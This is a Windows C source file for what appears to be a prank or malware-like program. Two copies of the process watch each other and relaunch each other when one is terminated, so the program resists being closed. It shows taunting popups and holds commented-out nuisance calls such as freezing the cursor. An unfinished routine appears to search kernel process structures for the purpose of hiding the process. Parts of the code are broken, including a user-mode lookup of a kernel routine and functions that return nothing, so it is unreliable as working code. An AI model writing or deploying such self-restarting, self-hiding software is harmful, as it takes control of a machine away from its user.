#include "utils.h"

#define ARG L"monitorproc"

void monitor();

VOID CALLBACK WaitOrTimerCallback(
	_In_  PVOID lpParameter,
	_In_  BOOLEAN TimerOrWaitFired
)
{
	LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
	GetModuleFileName(NULL, procn, MAX_PATH * 2);
	ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
	LocalFree(procn);

	monitor();
}


int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

	int argc;
	int poop = FSCTL_GET_NTFS_VOLUME_DATA;

	char buff[100] = { 0 };
	sprintf_s(buff, "%p", poop);
	popup(buff, buff);

	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc == 1 || lstrcmpW(argv[1], ARG)) {

		
		//CreateThread(NULL, NULL, &blink, NULL, 0, NULL);

		LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
		GetModuleFileName(NULL, procn, MAX_PATH * 2);

		ShellExecuteW(NULL, NULL, procn, ARG, NULL, SW_SHOWDEFAULT);
		
		Sleep(100000);
		popup("lol", "Still using this computer?\n");
		
	}
	else {

		//argv[0] = (LPWSTR)L"Blabla";

	}

	monitor();

	//while (popup("lol", "Still using this computer?\n") == IDYES) {}
	//HANDLE lightsT = CreateThread(NULL, NULL, &FlashLEDs, NULL, 0, NULL);
	

	//createNote(".\\note.txt", "WOowoowowooOOWoWOo", TRUE);
	

	//makeSearch("https://www.youtube.com/watch?v=T5y_OcKDadQ");

	//freezeCursor(15);

	

	while (true) Sleep(10000);
	return 0;
}

void monitor() {

	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);	// Get all current running processes

	LPWSTR iprocn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, 512);			// Get the current process's name
	GetProcessImageFileNameW(GetCurrentProcess(), iprocn, 512);
	iprocn = getImagNameW(iprocn);

	HANDLE cproc;
	char* cprocn = NULL;

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(entry);

	Process32First(snap, &entry);

	HANDLE nh;

	do {

		if (!lstrcmpW(iprocn, entry.szExeFile) && entry.th32ProcessID != GetCurrentProcessId()) {
			cproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
			RegisterWaitForSingleObject(&nh, cproc, WaitOrTimerCallback, NULL, INFINITE, WT_EXECUTEONLYONCE);
			break;
		}

	} while (Process32Next(snap, &entry));


	CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated
}

void hidep() {

	ULONG PID_OFFSET = find_eproc_pid();



	
}







static const UINT8 pid_amount = 3;

ULONG find_eproc_pid() {

	ULONG offset = 0;
	int index = 0;

	// I hate Microsoft 
	PsGetCurrentProcess GetPEproc = (PsGetCurrentProcess)GetProcAddress(GetModuleHandle((LPCWSTR)"ntdll.dll"), "PsGetCurrentProcess");

	LPVOID PEProc = GetPEproc();

	for (unsigned int i = 0x20; i < 0x300; i += 4) {

		if (*(ULONG*)((UCHAR*)PEProc + i) == GetCurrentProcessId()) {

		}
		
	}
	
	
	
	



}